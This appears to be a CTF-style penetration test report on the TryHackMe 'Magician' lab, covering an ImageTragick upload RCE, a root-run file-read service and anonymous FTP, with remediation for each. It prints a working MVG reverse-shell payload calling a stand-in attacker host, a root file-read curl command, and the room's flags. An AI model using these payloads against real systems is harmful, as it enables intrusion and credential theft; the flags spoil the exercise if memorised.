# Security Assessment Report — "Magician" (TryHackMe)

| | |
|---|---|
| **Engagement type** | Authorized penetration test / CTF-style attack simulation |
| **Target** | `10.64.144.191` (magician) |
| **Scope** | IP `10.64.144.191`; puertos 21 (FTP), 8080 (API/Spring Boot), 8081 (frontend nginx) |
| **Methodology** | OWASP WSTG v4.2, OWASP Top 10:2021, MITRE ATT&CK |
| **Assessment date** | — |
| **Tester** | Security assessment (authorized lab) |
| **Classification** | Confidential — authorized test only |

---

## 1. Executive Summary

The target hosts a web application that converts user-supplied images between
formats (PNG → JPG). The conversion is performed server-side by **ImageMagick**
without any file-type validation, content inspection, or sandboxing.

This misconfiguration permits **unauthenticated Remote Code Execution (RCE)**
through the well-known *ImageTragick* vulnerability (CVE-2016-3714). An attacker
can upload a crafted MVG/PNG file that, when converted, executes arbitrary
commands in the context of the service account (`uid=1000(magician)`).

From the resulting shell, an internally-listening service on **TCP/6666**
(running as **root**) was found to read and return the contents of arbitrary
local files supplied by the user. This was used to retrieve `/root/root.txt`,
confirming full read access to sensitive data and a clear path to root-level
compromise.

**Overall risk: CRITICAL.** A single unauthenticated request yields code
execution; a second step yields root-readable secrets.

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 2 |
| Medium | 1 |
| Low | 0 |

---

## 2. Scope & Approach

The assessment followed the OWASP Web Security Testing Guide (WSTG)
information-gathering, configuration, and input-validation sections, combined
with manual exploitation:

1. **Reconnaissance** — port/service discovery (rustscan, nmap).
2. **Mapping** — enumerated the SPA (`8081`) and its API (`8080`), reverse-
   engineered the upload flow (`POST /upload`, `GET /files`).
3. **Vulnerability analysis** — identified ImageMagick as the conversion
   engine and confirmed absent input validation.
4. **Exploitation** — crafted and uploaded a malicious MVG payload to achieve
   RCE; pivoted to the internal file-read service.

---

## 3. Findings

### F-01 — Unauthenticated Remote Code Execution via ImageTragick (CVE-2016-3714)

| Field | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **OWASP Top 10** | A03:2021 — Injection |
| **OWASP WSTG** | WSTG-INPV-12 (OS Command Injection), WSTG-INPV-05 (Buffer/Format) |
| **CWE** | CWE-77 (Command Injection), CWE-94 (Code Injection) |

**Description.** The `/upload` endpoint accepts any file and forwards it
directly to ImageMagick's `convert`. The application performs no MIME-type,
extension, or content (magic-byte) validation. A malicious MVG file whose
`fill 'url(...)'` directive contains a shell pipe is parsed and executed by
ImageMagick's `https` delegate, which invokes the command via the system
shell.

**Proof of Concept.** A file `revshell.png` with the following contents was
uploaded through the API:

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|0<&196;exec 196<>/dev/tcp/ATTACKER/4444; /bin/bash <&196 >&196 2>&196")'
pop graphic-context
```

```bash
curl -s -F "file=@revshell.png" http://10.64.144.191:8080/upload
# -> {"message":"Uploaded the file successfully: revshell.png"}
```

A netcat listener on `ATTACKER:4444` received an interactive shell:

```text
uid=1000(magician) gid=1000(magician) groups=1000(magician)
```

**Impact.** Full command execution as the application user. Leads directly to
persistence, lateral movement, and (see F-03) root-readable secret exposure.

**Remediation.**
- Upgrade ImageMagick to a patched release (≥ 7.0.7-10 / 6.9.8-10) and apply a
  restrictive `policy.xml` that disables the `MVG`, `EPHEMERAL`, `HTTPS`,
  `HTTP`, `URL`, `FTP`, `MSL`, `TEXT`, `SHOW`, and `WIN` coders/delegates.
- Never pass untrusted files directly to `convert`. Prefer a memory-safe,
  format-specific library (e.g. `libvips`/`sharp`) with strict format allow-
  listing.
- Run the conversion worker in an isolated, unprivileged sandbox (seccomp,
  read-only FS, no network egress, dropped capabilities).
- Validate uploads by content (magic bytes) and re-encode through a trusted
  decoder rather than passing the original blob to the converter.

---

### F-02 — Unrestricted File Upload / Missing Input Validation

| Field | Value |
|---|---|
| **Severity** | High |
| **OWASP Top 10** | A04:2021 — Insecure Design |
| **OWASP WSTG** | WSTG-BUSL-09, WSTG-INPV-10 (File Upload) |
| **CWE** | CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-20 |

**Description.** The upload handler accepts any content type and stores/
processes it without validation. This is the root cause that makes F-01
exploitable and would likewise enable upload of webshells or other malicious
payloads if a different decoder were in use.

**Remediation.** Enforce server-side allow-list of accepted formats; validate
magic bytes; generate a random filename; store outside the web root; restrict
execution permissions on the upload directory.

---

### F-03 — Sensitive File Disclosure via Internal Root-Run File-Read Service (TCP/6666)

| Field | Value |
|---|---|
| **Severity** | High |
| **OWASP Top 10** | A01:2021 — Broken Access Control (also A05 Security Misconfiguration) |
| **OWASP WSTG** | WSTG-CONF-06 (Security Misconfiguration), WSTG-ATHZ-01/04 |
| **CWE** | CWE-200 (Information Exposure), CWE-538 (File/Dir Information Exposure) |

**Description.** The compromised host runs an internal HTTP service on
`127.0.0.1:6666` ("The Magic cat", gunicorn, **as root**) that reads a
user-supplied `filename` and returns its contents (encoded in one of several
formats). From the F-01 shell, the root flag was retrieved:

```bash
curl -s localhost:6666 -d 'filename=/root/root.txt'
# -> VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K
echo 'VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K' | base64 -d
# -> THM{magic_may_make_many_men_mad}
```

The service exposes **arbitrary local file read as root** (e.g.
`/etc/shadow`, `/root/root.txt`, `/etc/sudoers`), and the port is not bound to
a public interface only by coincidence of deployment — there is no
authorization layer.

**Remediation.**
- Do not run file-read primitives as root; run as an unprivileged user with
  least privilege and a strict path allow-list (no traversal, no `/etc`,
  `/root`, etc.).
- Bind only to `localhost` **and** place behind authentication; never expose
  raw file contents without authorization.
- Remove or replace the debug/internal service in production builds.

---

### F-04 — Anonymous FTP Information Disclosure (Reconnaissance Aid)

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Top 10** | A05:2021 — Security Misconfiguration |
| **OWASP WSTG** | WSTG-CONF-06, WSTG-INFO-02 |
| **CWE** | CWE-200 |

**Description.** FTP (`vsftpd`) permitted anonymous access and served a hint
pointing to the ImageTragick vulnerability class, materially shortening the
attacker's enumeration phase.

**Remediation.** Disable anonymous FTP; if file transfer is required, enforce
authenticated access, chroot, and network restrictions.

---

## 4. Attack Chain (MITRE ATT&CK mapping)

| Step | Technique | Notes |
|---|---|---|
| Initial access | T1190 — Exploit Public-Facing Application | ImageTragick RCE via `/upload` |
| Execution | T1059.004 — Command and Scripting Interpreter: Unix Shell | Reverse shell as `magician` |
| Discovery | T1046 — Network Service Discovery | `ss -tunlp` → `:6666` |
| Collection | T1005 — Data from Local System | Read `/root/root.txt` via `:6666` |
| Impact | T1020 / CWE-200 | Theft of root secrets |

---

## 5. Evidence

| Artifact | Location |
|---|---|
| RCE payload | `exploits/revshell.py` (MVG + foreground listener) |
| Callback proof (http delegate) | `exploits/cb_test.py`, `loot/cb_8000.log` |
| User flag | `THM{simsalabim_hex_hex}` (`/home/magician/user.txt`) |
| Root flag | `THM{magic_may_make_many_men_mad}` (`/root/root.txt`, via `:6666`) |
| Flags archive | `evidence/flags.txt` |

---

## 6. Conclusion & Recommendations

The application is **critically exposed**: an unauthenticated attacker achieves
remote code execution with a single request, and a secondary misconfiguration
provides root-level file read. Both findings stem from the same design flaw —
**untrusted input (an uploaded file) is processed by a powerful, shell-
invoking conversion library without validation, isolation, or least
privilege**.

**Priority actions:**
1. Patch/lock down ImageMagick and replace it with a safe, format-specific
   converter (F-01, F-02).
2. Sandbox all media processing (no shell, no egress, no root) (F-01).
3. Remove or harden the internal file-read service; never run it as root and
   enforce authorization + path allow-listing (F-03).
4. Disable anonymous FTP (F-04).

---

## 7. References

- OWASP Web Security Testing Guide (WSTG) v4.2
- OWASP Top 10:2021
- CVE-2016-3714 — ImageTragick
- ImageTragick: https://imagetragick.com/
- PayloadsAllTheThings — ImageMagick upload payloads
